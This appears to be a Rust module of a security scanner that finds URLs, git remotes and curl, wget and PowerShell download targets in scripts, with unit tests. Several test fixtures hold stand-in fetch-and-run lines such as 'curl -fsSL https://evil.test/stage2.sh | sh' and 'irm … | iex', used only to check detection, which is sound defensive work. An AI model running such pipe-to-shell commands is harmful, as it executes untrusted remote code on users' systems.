//! URLs in text, git remotes, and the targets of downloader commands
//! (`curl`, `wget`, PowerShell's `iwr`/`irm`).

use filefacts::{Arg, RefKind, RefLocator, Reference, Symbol};

use super::found::Found;
use super::shell::tool_name;
use super::{Discovery, Lang, UnresolvedFetchCall};
use crate::fetch::is_http_url;

/// Scan text line by line for `http`/`https` URLs (curl/wget targets, a URL in
/// a variable) and emit a [`RefKind::UrlFetch`] per URL, cited by its line.
/// The line is placed once, however many URLs it holds.
pub(super) fn urls(text: &str, source: &str, out: &mut Found<'_>) {
    for line in text.lines() {
        let evidence = line.trim();
        let mut at = None;
        for url in extract_urls(line) {
            let locator = url_locator(url);
            let offset = *at.get_or_insert_with(|| out.locate(evidence, &locator));
            out.push_at(locator, RefKind::UrlFetch, source, evidence, offset);
        }
    }
}

/// A URL found in text as a locator, its scheme lower-cased: `curl HTTPS://…`
/// fetches the same resource as `https://…`, and should be the same reference.
pub(super) fn url_locator(url: &str) -> RefLocator {
    RefLocator::Url(match url.split_once("://") {
        Some((scheme, rest)) => format!("{}://{rest}", scheme.to_ascii_lowercase()),
        None => url.to_owned(),
    })
}

/// Each `http`/`https` URL embedded in a string, its scheme matched
/// case-insensitively as curl and wget accept it. A URL runs until the first
/// character that cannot appear in one unquoted in a shell command.
pub(super) fn extract_urls(text: &str) -> UrlScan<'_> {
    UrlScan { rest: text }
}

/// The iterator [`extract_urls`] returns. Each step only moves forward through
/// the text, so a scan costs time linear in its length.
#[derive(Debug)]
pub(super) struct UrlScan<'a> {
    rest: &'a str,
}

impl<'a> Iterator for UrlScan<'a> {
    type Item = &'a str;

    fn next(&mut self) -> Option<&'a str> {
        loop {
            let start = self
                .rest
                .as_bytes()
                .windows(4)
                .position(|w| w.eq_ignore_ascii_case(b"http"))?;
            let cand = &self.rest[start..];
            let prefix = |p: &str| {
                cand.get(..p.len())
                    .is_some_and(|c| c.eq_ignore_ascii_case(p))
            };
            if !prefix("http://") && !prefix("https://") {
                self.rest = &cand[4..];
                continue;
            }
            let end = cand
                .find(|c: char| {
                    c.is_whitespace()
                        || matches!(
                            c,
                            '"' | '\'' | '|' | ';' | '`' | '<' | '>' | '(' | ')' | ','
                        )
                })
                .unwrap_or(cand.len());
            self.rest = &cand[end..];
            let Some(url) = untemplated(&cand[..end]) else {
                continue;
            };
            // Drop the bytes that ended the *text*, not the URL: a shell
            // line-continuation backslash, the punctuation closing a sentence,
            // an empty fragment naming the same resource.
            let url = url.trim_end_matches(['\\', '#', '.', ',', ';', ':', '!', '?']);
            if url.len() > "https://".len() {
                return Some(url);
            }
        }
    }
}

/// `url` cut to what it names before a template takes over, or `None` when
/// the host is not a literal one.
///
/// Its text stops at a `}` closing the code around it (`{url:
/// 'http://api:8081'}`) or an escape ending the string (`\\n`, `\\"`). After
/// that, `$` and `{` open a shell variable, format string, f-string or JS
/// template (`http://{host}:{port}/`, `…/go${VERSION}.tar.gz`) and `\\` a
/// regular expression (`https://github\\.com`). In the host that leaves no
/// address — a fetch would only fail, or reach whatever the bare prefix
/// happens to name — so the URL is dropped. Later on, the host is still worth
/// reporting, so the URL is cut back to the last directory (or the query)
/// that is all literal, never to half a file name.
fn untemplated(url: &str) -> Option<&str> {
    // One forward pass: a run of backslashes is stepped over whole, so a long
    // run costs its length once rather than once per backslash in it.
    let mut stop = url.len();
    let mut at = 0;
    while let Some(found) = url[at..].find(['}', '\\']) {
        let here = at + found;
        if url.as_bytes()[here] == b'}' {
            stop = here;
            break;
        }
        let run = url[here..].bytes().take_while(|&b| b == b'\\').count();
        if url[here + run..].starts_with(['n', 'r', 't', '"', '\'']) {
            stop = here;
            break;
        }
        at = here + run;
    }
    let url = &url[..stop];
    let authority_start = url.find("://")? + 3;
    let authority_end = url[authority_start..]
        .find(['/', '?', '#'])
        .map_or(url.len(), |i| authority_start + i);
    let syntax = url.find(['$', '{', '\\']).unwrap_or(url.len());
    if syntax < authority_end
        || !url[authority_start..authority_end]
            .chars()
            .any(char::is_alphanumeric)
    {
        return None;
    }
    if syntax == url.len() {
        return Some(url);
    }
    let head = &url[..syntax];
    let keep = match head[authority_end..].find(['?', '#']) {
        Some(query) => authority_end + query,
        None => head
            .rfind('/')
            .filter(|&slash| slash >= authority_end)
            .map_or(authority_end, |slash| slash + 1),
    };
    Some(&url[..keep])
}

/// Recognize git source references — a `git clone <url>` command, or a
/// `git+<scheme>://…` VCS package specifier (`pip install git+https://…`, an npm
/// `git+ssh://` dependency). Cloning or installing from a repo pulls in external
/// source that bypasses the package registry, so it is a fetch target in its own
/// right — emitted as a [`RefKind::Repository`]. SSH (`git@host:…`) and `git+`
/// forms that the http-only URL scan would miss are covered here. Runs on raw
/// (un-normalized) text, so `://` survives.
pub(super) fn git_refs(text: &str, source: &str, out: &mut Found<'_>) {
    for line in text.lines() {
        let evidence = line.trim();
        let mut repos = Vec::new();
        let mut rest = line;
        while let Some(i) = rest.find("git+") {
            let spec = &rest[i + 4..];
            // The git URL runs to whitespace or a shell/source delimiter.
            let end = spec
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '"' | '\'' | '`' | ',' | '(' | ')' | '[' | ']')
                })
                .unwrap_or(spec.len());
            repos.extend(normalize_git_target(&spec[..end]));
            rest = &spec[end..];
        }
        repos.extend(git_clone_target(line).and_then(normalize_git_target));
        let mut at = None;
        for repo in repos {
            let locator = RefLocator::Url(repo);
            let offset = *at.get_or_insert_with(|| out.locate(evidence, &locator));
            out.push_at(locator, RefKind::Repository, source, evidence, offset);
        }
    }
}

/// The clone target of a `git clone [flags] <target>` line — the first
/// non-flag argument after `git clone`. `None` if the line is not a clone.
fn git_clone_target(line: &str) -> Option<&str> {
    let toks: Vec<&str> = line.split_whitespace().collect();
    let pos = toks
        .windows(2)
        .position(|w| w[0] == "git" && w[1] == "clone")?;
    toks[pos + 2..]
        .iter()
        .find(|t| !t.starts_with('-'))
        .copied()
}

/// A validated git target: a URL (`scheme://…`) or SSH shorthand (`git@host:…`),
/// with surrounding quotes and a trailing `.git` stripped. `None` for anything
/// that is not a git remote.
fn normalize_git_target(s: &str) -> Option<String> {
    let s = s.trim_matches(|c| matches!(c, '"' | '\'' | '`' | ')' | ']' | ','));
    let is_git = s.contains("://") || s.starts_with("git@");
    (is_git && s.len() >= 8).then(|| s.trim_end_matches(".git").to_owned())
}

/// A network fetch command, and which of its options take the next word as
/// their value — so an option's value (`curl -o payload.sh`, `iwr -OutFile
/// a.ps1`) is never mistaken for the target.
#[derive(Debug)]
struct FetchTool {
    names: &'static [&'static str],
    takes_value: fn(&str) -> bool,
    /// Whether `--url <target>` / `--url=<target>` names a target.
    url_option: bool,
}

const CURL: FetchTool = FetchTool {
    names: &["curl", "curl.exe"],
    takes_value: |opt| {
        gnu_option_takes_value(
            opt,
            "AbcCdDeEFHKmoPQrtTuUwxXyYz",
            &[
                "alt-svc",
                "cacert",
                "capath",
                "cert",
                "config",
                "connect-timeout",
                "connect-to",
                "continue-at",
                "cookie",
                "cookie-jar",
                "create-file-mode",
                "data",
                "data-ascii",
                "data-binary",
                "data-raw",
                "data-urlencode",
                "dns-servers",
                "dump-header",
                "etag-compare",
                "etag-save",
                "form",
                "form-string",
                "header",
                "hsts",
                "interface",
                "json",
                "keepalive-time",
                "key",
                "limit-rate",
                "local-port",
                "max-filesize",
                "max-redirs",
                "max-time",
                "netrc-file",
                "noproxy",
                "oauth2-bearer",
                "output",
                "output-dir",
                "pass",
                "preproxy",
                "proto",
                "proto-redir",
                "proxy",
                "proxy-user",
                "range",
                "referer",
                "request",
                "resolve",
                "retry",
                "retry-delay",
                "retry-max-time",
                "socks4",
                "socks4a",
                "socks5",
                "socks5-hostname",
                "speed-limit",
                "speed-time",
                "stderr",
                "time-cond",
                "trace",
                "trace-ascii",
                "upload-file",
                "user",
                "user-agent",
                "variable",
                "write-out",
            ],
        )
    },
    url_option: true,
};

const WGET: FetchTool = FetchTool {
    names: &["wget", "wget.exe"],
    takes_value: |opt| {
        gnu_option_takes_value(
            opt,
            "aABDeiIlOoPQRtTUwX",
            &[
                "accept",
                "append-output",
                "base",
                "bind-address",
                "body-data",
                "body-file",
                "ca-certificate",
                "certificate",
                "config",
                "connect-timeout",
                "default-page",
                "directory-prefix",
                "dns-timeout",
                "domains",
                "execute",
                "exclude-directories",
                "exclude-domains",
                "ftp-password",
                "ftp-user",
                "header",
                "http-password",
                "http-user",
                "include-directories",
                "input-file",
                "level",
                "limit-rate",
                "load-cookies",
                "local-encoding",
                "method",
                "output-document",
                "output-file",
                "password",
                "post-data",
                "post-file",
                "private-key",
                "quota",
                "read-timeout",
                "referer",
                "reject",
                "rejected-log",
                "remote-encoding",
                "save-cookies",
                "timeout",
                "tries",
                "user",
                "user-agent",
                "wait",
                "waitretry",
            ],
        )
    },
    url_option: false,
};

const POWERSHELL_FETCH: FetchTool = FetchTool {
    names: &[
        "irm",
        "iwr",
        "invoke-restmethod",
        "invoke-webrequest",
        "irm.exe",
        "iwr.exe",
    ],
    takes_value: powershell_option_takes_value,
    url_option: false,
};

/// What [`Targets`] reads in a downloader's argument list.
enum Target<'a> {
    /// A word in target position.
    Word(&'a str),
    /// A word whose text is a runtime value, read where it would decide what
    /// the rest of the arguments mean.
    Unknown,
}

/// A downloader's target-position words, in order: its options, and the values
/// they take, skipped. Each argument is `None` when it is not literal text. A
/// skipped option value is never read, so a runtime value there is no gap.
struct Targets<I> {
    tool: &'static FetchTool,
    args: I,
    /// Whether options are still recognized (no `--` seen yet).
    options: bool,
}

impl<'a, I: Iterator<Item = Option<&'a str>>> Iterator for Targets<I> {
    type Item = Target<'a>;

    fn next(&mut self) -> Option<Target<'a>> {
        loop {
            let Some(word) = self.args.next()? else {
                return Some(Target::Unknown);
            };
            if !self.options {
                return Some(Target::Word(word));
            }
            if word == "--" {
                self.options = false;
                continue;
            }
            if self.tool.url_option {
                if word == "--url" {
                    return Some(self.args.next()?.map_or(Target::Unknown, Target::Word));
                }
                if let Some(url) = word.strip_prefix("--url=") {
                    return Some(Target::Word(url));
                }
            }
            if word.starts_with('-') {
                if (self.tool.takes_value)(word) {
                    self.args.next();
                }
                continue;
            }
            return Some(Target::Word(word));
        }
    }
}

impl FetchTool {
    fn targets<'a, I>(&'static self, args: I) -> Targets<I::IntoIter>
    where
        I: IntoIterator<Item = Option<&'a str>>,
    {
        Targets {
            tool: self,
            args: args.into_iter(),
            options: true,
        }
    }
}

/// Whether a GNU-style option consumes the next word. A long option does when
/// it is listed and has no `=value` attached. In a short cluster the first
/// value-taking letter takes the rest of the cluster as its value (`-ofile`),
/// or, when it ends the cluster, the next word (`-fsSLo file`).
fn gnu_option_takes_value(opt: &str, short: &str, long: &[&str]) -> bool {
    if let Some(name) = opt.strip_prefix("--") {
        return !name.contains('=') && long.contains(&name);
    }
    let cluster = opt.trim_start_matches('-');
    cluster
        .char_indices()
        .find(|&(_, c)| short.contains(c))
        .is_some_and(|(i, c)| i + c.len_utf8() == cluster.len())
}

/// Whether an `Invoke-WebRequest`/`Invoke-RestMethod` parameter consumes the
/// next word. Every parameter takes a value except the switches, matched by
/// prefix since PowerShell accepts any unambiguous abbreviation. `-Uri`'s
/// value is the target itself, so it is left to be scanned; `-Name:value`
/// carries its own.
fn powershell_option_takes_value(opt: &str) -> bool {
    const SWITCHES: &[&str] = &[
        "allowinsecureredirect",
        "allowunencryptedauthentication",
        "disablekeepalive",
        "noproxy",
        "passthru",
        "preserveauthorizationonredirect",
        "preservehttpmethodonredirect",
        "proxyusedefaultcredentials",
        "resume",
        "skipcertificatecheck",
        "skipheadervalidation",
        "skiphttperrorcheck",
        "usebasicparsing",
        "usedefaultcredentials",
    ];
    let name = opt.trim_start_matches('-');
    if name.is_empty() || name.contains(':') {
        return false;
    }
    let name = name.to_ascii_lowercase();
    !"uri".starts_with(&name) && !SWITCHES.iter().any(|switch| switch.starts_with(&name))
}

/// A conservative host/path check used only after a recognized fetch command:
/// a dotted host name or an IPv4 address, an optional numeric port, and an
/// optional path.
fn looks_like_protocolless_url(value: &str) -> bool {
    if value.is_empty()
        || value.contains(['\\', '"', '\'', '`', '|', ';', '<', '>', '(', ')'])
        || value.contains("//")
    {
        return false;
    }
    let (authority, path) = value
        .split_once('/')
        .map_or((value, None), |(h, p)| (h, Some(p)));
    let (host, port) = authority
        .split_once(':')
        .map_or((authority, None), |(h, p)| (h, Some(p)));
    if host.is_empty()
        || path.is_some_and(|path| path.is_empty() || path.contains(':'))
        || port.is_some_and(|port| {
            !port.bytes().all(|b| b.is_ascii_digit()) || !port.parse::<u16>().is_ok_and(|n| n > 0)
        })
        || !host.contains('.')
    {
        return false;
    }
    if host.parse::<std::net::Ipv4Addr>().is_ok() {
        return true;
    }
    let labels: Vec<&str> = host.split('.').collect();
    if labels.len() < 2
        || labels.iter().any(|label| {
            label.is_empty()
                || label.starts_with('-')
                || label.ends_with('-')
                || !label
                    .bytes()
                    .all(|byte| byte.is_ascii_alphanumeric() || byte == b'-')
        })
    {
        return false;
    }
    labels
        .last()
        .is_some_and(|tld| tld.len() >= 2 && tld.bytes().all(|byte| byte.is_ascii_alphabetic()))
}

/// Find protocol-less host/path arguments to a known network fetch command in
/// `lang`'s text. Explicit URLs are left to [`urls`]; this pass emits only the
/// missing-scheme cases, normalized to HTTPS so the fetch boundary can parse
/// and SSRF-check the resulting locator.
pub(super) fn bare_fetch_urls(text: &str, lang: Lang, out: &mut Found<'_>) {
    let tools: &[&'static FetchTool] = if lang == Lang::PowerShell {
        &[&POWERSHELL_FETCH]
    } else {
        &[&CURL, &WGET]
    };
    for line in text.lines() {
        let tokens: Vec<&str> = line.split_whitespace().collect();
        let invocations: Vec<(usize, &'static FetchTool)> = tokens
            .iter()
            .enumerate()
            .filter_map(|(index, token)| {
                let command =
                    tool_name(token.trim_matches(|c| matches!(c, '\'' | '"' | '`' | '(')));
                let tool = tools.iter().find(|tool| {
                    tool.names
                        .iter()
                        .any(|name| command.eq_ignore_ascii_case(name))
                })?;
                Some((index, *tool))
            })
            .collect();
        // Each invocation's arguments end where the next one begins, so a
        // line of nothing but tool names costs linear time, not quadratic.
        // A target past the next invocation is that invocation's to find.
        for (n, &(index, tool)) in invocations.iter().enumerate() {
            let end = invocations
                .get(n + 1)
                .map_or(tokens.len(), |&(next, _)| next);
            let target = tool
                .targets(command_words(&tokens[index + 1..end]).map(Some))
                .find_map(|target| match target {
                    Target::Word(word) => looks_like_protocolless_url(word).then_some(word),
                    Target::Unknown => None,
                });
            if let Some(target) = target {
                out.push(
                    RefLocator::Url(format!("https://{target}")),
                    RefKind::UrlFetch,
                    lang.label(),
                    line.trim(),
                );
            }
        }
    }
}

/// The words of one command among a line's `tokens`: up to a separator or
/// redirection, or through a word an operator is glued to (`x.sh|sh`,
/// `host;rm`), cut there. Quotes and closing brackets around a word are
/// shell or code syntax, not part of it.
fn command_words<'a>(tokens: &[&'a str]) -> impl Iterator<Item = &'a str> {
    let mut ended = false;
    tokens.iter().map_while(move |&raw| {
        if ended
            || matches!(raw, "|" | "||" | "&&" | "&" | ";")
            || raw.starts_with(['>', '<'])
            || raw.starts_with("1>")
            || raw.starts_with("2>")
        {
            return None;
        }
        let word = match raw.find(['|', ';', '&', '>', '<']) {
            Some(at) => {
                ended = true;
                &raw[..at]
            }
            None => raw,
        };
        Some(word.trim_matches(|c| matches!(c, '\'' | '"' | '`' | ')' | ']' | '}' | ',' | ';')))
    })
}

/// Literal HTTP(S) targets of `curl` and `wget` calls in shell call facts, and
/// the calls whose arguments are runtime values. An expansion can introduce an
/// option that consumes the next word, so once one is read nothing after it
/// is guessed at. Option values are never targets.
pub(super) fn fetch_calls(symbols: &[Symbol]) -> Discovery {
    let mut out = Discovery::default();
    for symbol in symbols {
        let Symbol::Call {
            target: Some(target),
            args,
            offset,
        } = symbol
        else {
            continue;
        };
        let command = tool_name(target);
        let tool = match command {
            "curl" => &CURL,
            "wget" => &WGET,
            _ => continue,
        };
        let words = args.iter().map(|arg| {
            let word = match arg {
                Arg::String { value } => value.as_str(),
                Arg::Identifier { name } => name.as_str(),
                _ => return None,
            };
            (!word.contains(['$', '`', '\n', '\r'])).then_some(word)
        });
        for target in tool.targets(words) {
            let Target::Word(word) = target else {
                out.unresolved.push(UnresolvedFetchCall {
                    command: command.to_owned(),
                    offset: *offset,
                });
                break;
            };
            let url = if is_http_url(word) {
                word.to_owned()
            } else if looks_like_protocolless_url(word) {
                format!("https://{word}")
            } else {
                continue;
            };
            let mut reference = Reference::new(
                RefLocator::Url(url),
                RefKind::UrlFetch,
                "ast-fetch-call",
                word,
            );
            reference.offset = *offset;
            out.references.push(reference);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::super::references_in_bytes;
    use super::super::tests::{locators, urls};
    use super::*;

    fn shell_calls(script: &[u8]) -> Discovery {
        let parsed = filefacts::OpenOptions::new()
            .path(std::path::Path::new("test.sh"))
            .open(script);
        fetch_calls(parsed.symbols().as_slice())
    }

    #[test]
    fn shell_fetch_calls_report_unknown_targets_without_exposing_arguments() {
        let discovery = shell_calls(
            br##"#!/bin/sh
curl "$PRIVATE_ENDPOINT"
wget --output-document "$DEST" "$REMOTE"
curl "$OPTIONS" https://not-yet-a-target.test/stage
curl https://known.test/stage "$ANOTHER"
curl --url "$TARGET"
curl --url="$TARGET"
curl $(choose_url)
"##,
        );
        assert_eq!(
            locators(&discovery.references),
            ["https://known.test/stage"]
        );
        assert_eq!(discovery.unresolved.len(), 7);
        assert!(
            discovery
                .unresolved
                .iter()
                .all(|call| matches!(call.command.as_str(), "curl" | "wget")
                    && call.offset.is_some())
        );
    }

    #[test]
    fn shell_fetch_option_values_do_not_create_unknown_target_gaps() {
        let discovery = shell_calls(
            br##"#!/bin/sh
# curl "$COMMENT"
printf '%s' 'curl "$PRINTED"'
curl --header "$AUTH" --data "$BODY" --output "$DEST" https://known.test/stage
wget -O "$DEST" --header "$AUTH" https://second.test/stage
curl --output "$DEST" --version
curl --url
"##,
        );
        assert!(
            discovery.unresolved.is_empty(),
            "{:?}",
            discovery.unresolved
        );
        assert_eq!(discovery.references.len(), 2);
    }

    #[test]
    fn shell_fetch_calls_keep_targets_and_skip_option_values_and_printed_text() {
        let discovery = shell_calls(
            br##"#!/bin/sh
# curl https://comment.test/no
printf '%s\n' 'curl https://printed.test/no'
curl -fsSLo stage.sh -H 'Referer: https://header.test/no' --data 'https://body.test/no' 'https://one.test/a?x=1&y=2'
/usr/bin/wget -O stage --header='https://header.test/no' https://two.test/b
curl --url https://three.test/c --url=https://four.test/d
curl "$options" https://computed-options.test/no
curl "$endpoint"
xinput test device
"##,
        );
        assert_eq!(
            locators(&discovery.references),
            [
                "https://one.test/a?x=1&y=2",
                "https://two.test/b",
                "https://three.test/c",
                "https://four.test/d"
            ]
        );
        assert!(
            discovery
                .references
                .iter()
                .all(|r| r.kind == RefKind::UrlFetch && r.offset.is_some())
        );
    }

    #[test]
    fn a_urls_trailing_text_punctuation_is_not_part_of_it() {
        let text = "curl https://evil.test/a.sh \\\n\
            see https://evil.test/b.tar.gz.\n\
            https://evil.test/c#\n";
        assert_eq!(
            extract_urls(text).collect::<Vec<_>>(),
            [
                "https://evil.test/a.sh",
                "https://evil.test/b.tar.gz",
                "https://evil.test/c",
            ]
        );
    }

    /// Only the *trailing* run goes: a yarn `resolved` fragment carries the
    /// entry's digest, and a query string is part of the address.
    #[test]
    fn punctuation_inside_a_url_survives_the_tail_trim() {
        let text = "resolved https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#5b8a3a77 \
            https://evil.test/s.sh?v=1.2&t=x";
        assert_eq!(
            extract_urls(text).collect::<Vec<_>>(),
            [
                "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#5b8a3a77",
                "https://evil.test/s.sh?v=1.2&t=x",
            ]
        );
    }

    #[test]
    fn untemplated_stops_at_the_first_escape_after_a_backslash_run() {
        assert_eq!(
            untemplated("https://a.test/x\\\\\\n"),
            Some("https://a.test/x")
        );
        assert_eq!(untemplated("https://a.test/x}y"), Some("https://a.test/x"));
        assert_eq!(
            untemplated("https://a.test/a\\\\.b/c"),
            Some("https://a.test/")
        );
        assert_eq!(untemplated("https://a\\.test/x"), None);
        assert_eq!(untemplated("https://a.test/x\\"), Some("https://a.test/"));
    }

    #[test]
    fn shell_urls_are_found() {
        let found = urls(
            b"#!/bin/sh\n\
            URL1=\"https://web.stanford.edu/~pseay/pliant/et\"\n\
            curl -fsSL https://evil.test/stage2.sh | sh\n",
            "x.sh",
        );
        assert!(found.contains(&"https://web.stanford.edu/~pseay/pliant/et".to_owned()));
        assert!(found.contains(&"https://evil.test/stage2.sh".to_owned()));
        assert!(
            urls(
                b"FROM alpine\nRUN curl -fsSL https://example.com/index.html | sh\n",
                "Dockerfile"
            )
            .contains(&"https://example.com/index.html".to_owned())
        );
    }

    #[test]
    fn an_options_value_is_not_a_host() {
        // Each output filename has a dot and a plausible TLD (`.sh`, `.py` and
        // `.exe` would all pass the host check), so only option parsing keeps
        // it from becoming a fetch of `https://payload.sh`.
        for (script, want) in [
            ("curl -o payload.sh https://evil.test/p\n", None),
            (
                "wget -O setup.exe example.com/x\n",
                Some("https://example.com/x"),
            ),
            (
                "curl -fsSLo install.py example.com/x\n",
                Some("https://example.com/x"),
            ),
            (
                "curl -oinstall.py example.com/x\n",
                Some("https://example.com/x"),
            ),
            (
                "curl --output=a.sh example.com/x\n",
                Some("https://example.com/x"),
            ),
            (
                "curl --output a.sh example.com/x\n",
                Some("https://example.com/x"),
            ),
            (
                "curl -H x-api.key example.com/x\n",
                Some("https://example.com/x"),
            ),
            (
                "curl -o out.sh --url example.com/x\n",
                Some("https://example.com/x"),
            ),
            // A redirection target is a file, not an argument.
            ("curl -s \"$U\" > install.sh\n", None),
            ("wget -qO- \"$U\" >install.sh\n", None),
        ] {
            let got = urls(script.as_bytes(), "install.sh");
            let bare: Vec<_> = got.iter().filter(|u| !u.contains("evil.test")).collect();
            assert_eq!(
                bare.first().map(|u| u.as_str()),
                want,
                "{script:?}: {got:?}"
            );
            assert_eq!(
                bare.len(),
                usize::from(want.is_some()),
                "{script:?}: {got:?}"
            );
        }
    }

    #[test]
    fn each_fetch_command_on_a_line_is_scanned_on_its_own() {
        let got = urls(b"curl -o a.sh a.example/x && wget b.example/y\n", "x.sh");
        assert!(got.contains(&"https://a.example/x".to_owned()), "{got:?}");
        assert!(got.contains(&"https://b.example/y".to_owned()), "{got:?}");
        assert!(!got.iter().any(|u| u.contains("a.sh")), "{got:?}");
    }

    #[test]
    fn powershell_parameters_take_values_except_switches() {
        for (script, want) in [
            (
                "iwr -OutFile a.ps1 example.com/x\n",
                "https://example.com/x",
            ),
            (
                "iwr -UseBasicParsing example.com/x\n",
                "https://example.com/x",
            ),
            ("iwr -UseB example.com/x\n", "https://example.com/x"),
            (
                "Invoke-WebRequest -Uri example.com/x -OutFile a.ps1\n",
                "https://example.com/x",
            ),
            (
                "iwr -OutFile:a.ps1 example.com/x\n",
                "https://example.com/x",
            ),
        ] {
            assert_eq!(urls(script.as_bytes(), "stage.ps1"), [want], "{script:?}");
        }
    }

    #[test]
    fn bare_urls_in_fetch_commands_become_fetchable_references() {
        let refs = references_in_bytes(
            b"irm cdn.jsdelivr.net/gh/example/stage.ps1 | iex\n",
            "stage.ps1",
        )
        .references;
        assert!(refs.iter().any(|r| r.kind == RefKind::UrlFetch
            && r.locator
                == RefLocator::Url("https://cdn.jsdelivr.net/gh/example/stage.ps1".into())));

        let refs = references_in_bytes(
            b"irm https://cdn.jsdelivr.net/gh/example/stage | iex\n",
            "stage.ps1",
        )
        .references;
        assert!(refs.iter().any(|r| {
            r.locator == RefLocator::Url("https://cdn.jsdelivr.net/gh/example/stage".into())
                && r.source == "string"
                && r.evidence == "irm https://cdn.jsdelivr.net/gh/example/stage | iex"
        }));

        assert!(
            urls(b"curl jsonkeeper.com/abc123\n", "install.sh")
                .contains(&"https://jsonkeeper.com/abc123".to_owned())
        );
        assert!(
            urls(b"/usr/bin/curl -fsSL evil.test/x.sh | sh\n", "a.sh")
                .contains(&"https://evil.test/x.sh".to_owned())
        );
    }

    #[test]
    fn a_fetch_target_after_a_repeated_tool_name_is_still_found() {
        let line = format!("{} curl -o curl evil.test/x.sh\n", "curl ".repeat(20_000));
        assert!(urls(line.as_bytes(), "x.sh").contains(&"https://evil.test/x.sh".to_owned()));
    }

    #[test]
    fn uppercase_schemes_are_urls_with_a_canonical_scheme() {
        assert!(
            urls(b"curl HTTPS://evil.test/x.sh|sh\n", "a.sh")
                .contains(&"https://evil.test/x.sh".to_owned())
        );
        assert!(extract_urls("see HTTP/1.1 and http").next().is_none());
    }

    #[test]
    fn bare_targets_may_be_ip_addresses_and_carry_a_port() {
        for (text, url) in [
            ("curl 203.0.113.5/x.sh|sh\n", "https://203.0.113.5/x.sh"),
            ("curl evil.test:8443/p\n", "https://evil.test:8443/p"),
            ("wget -q 198.51.100.7:8080\n", "https://198.51.100.7:8080"),
        ] {
            assert!(
                urls(text.as_bytes(), "a.sh").contains(&url.to_owned()),
                "{text:?}"
            );
        }
        for value in [
            "evil.test:0/x",
            "evil.test:99999",
            "evil.test:ab",
            "1.2.3.4/a:b",
        ] {
            assert!(!looks_like_protocolless_url(value), "{value}");
        }
    }

    #[test]
    fn recognizes_git_clone_and_vcs_specifiers() {
        let refs = references_in_bytes(
            b"#!/bin/sh\n\
            git clone https://github.com/evil/payload.git /tmp/p\n\
            git clone git@gitlab.com:evil/stage2.git\n\
            pip install git+https://github.com/evil/wheelhouse\n",
            "setup.sh",
        )
        .references;
        let repos = locators(refs.iter().filter(|r| r.kind == RefKind::Repository));
        assert!(
            repos.contains(&"https://github.com/evil/payload"),
            "{repos:?}"
        );
        assert!(repos.contains(&"git@gitlab.com:evil/stage2"), "{repos:?}");
        // The string-URL scan claims the bare https form of the `git+` repo
        // first, so it lands as a UrlFetch.
        assert!(locators(&refs).contains(&"https://github.com/evil/wheelhouse"));
    }
}
